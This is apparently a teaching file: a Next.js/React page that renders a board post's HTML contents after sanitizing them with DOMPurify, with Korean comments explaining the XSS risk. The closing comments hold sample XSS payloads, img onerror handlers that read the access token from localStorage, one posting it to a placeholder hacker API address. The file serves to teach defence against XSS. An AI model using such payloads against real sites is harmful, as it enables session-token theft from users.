import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import {
  IQuery,
  IQueryFetchBoardArgs,
} from "../../../src/commons/types/generated/types";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function WebEditorDetailPage() {
  const router = useRouter();
  const { data } = useQuery<Pick<IQuery, "fetchBoard">, IQueryFetchBoardArgs>(
    FETCH_BOARD,
    {
      variables: {
        boardId: String(router.query.id),
      },
    }
  );

  return (
    <div>
      <div>작성자 : {data?.fetchBoard.writer}</div>
      <div>제목 : {data?.fetchBoard.title}</div>
      {/* <div>내용 : {data?.fetchBoard.contents} </div> */}
      {process.browser && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(String(data?.fetchBoard.contents)),
          }}
        ></div>
      )}
      {/* 이렇게 끝나면 위험하다구~ */}
      {/* Dompurify로 막아주자 */}
    </div>
  );
}

// <img src="#" on error="console.log(const aaa = localStorage.getItem("accessToken")) axios.post(해커API주소, { accessToken })" />
// <img src='#' on error='console.log(localStorage.getItem(\"accessToken\"))' />
// 리액트 퀼은 방어해주지만 다른 곳으로 넘기면 어려움
